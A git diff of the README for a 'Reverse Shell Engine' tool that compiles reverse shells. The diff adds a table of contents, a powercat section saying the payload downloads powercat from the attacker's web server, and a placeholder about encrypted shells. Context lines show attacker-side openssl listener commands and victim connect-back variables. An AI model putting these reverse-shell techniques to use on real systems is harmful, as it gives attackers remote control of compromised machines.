@@ -1,11 +1,30 @@
-# RSE - Reverse Shell Generator
+
+# RSE - Reverse Shell Engine
+
+
+- [What is RSE](#What-is-RSE?)
+- [Installation](#Installation)
+- [How it works](#How-it-works)
+    - [Quickstart]()
+    - [Reverse shell types and how they work]()
+        - [linux-openssl-tcp-noenc]()
+        - [windows-ps_powercat-tcp-noenc]()
+    - [Encrypted shells]()
+- [Some more information]()
+- [Contribute]()
+
+---
+---
+
 
 ![RSE-screenshot-1](img/rse-screenshot-1.png)
 
 ![RSE-screenshot-1](img/rse-screenshot-2.png)
 
 
-## What id RSE? Reverse Shell Engine 
+# What is RSE? 
+
+RSE stands for: Reverse Shell Engine
 This tool is just a compilation of many reverse shells found on the internet and some other contributions.
 
 A reverse shell is a remote control technique where a target computer, after being compromised by an attacker's code, establishes a connection back to the attacker's machine. This allows the attacker to gain command-line access and control over the target system, often used in cyberattacks for remote exploitation or unauthorized access. Reverse shells are a method to bypass certain network restrictions, but their use should strictly adhere to ethical and legal guidelines.
@@ -49,7 +68,7 @@ So for the most cases you can just use on your listenning machine something like
 
 When the client makes connection to your server you will be able to execute some commands on the other side.
 
-### OpenSSL
+### linux-openssl-tcp-noenc
 ```
 user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days
 user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port <port>
@@ -70,7 +89,15 @@ export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpsk"
 # client (victim)
 export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpsk"
 ```
+### windows-ps_powercat-tcp-noenc
 
+Consider launching a web server too with this reverse shell since it's needed for the payload to download powercat first.
+
+## Encrypted shells: 
+
+Comming soon
+
+In this section soon you will be able to find advanced reverse shell types with encryption layers with AES and more features. Stay tuned! :) 
 
 ## Some more information
 
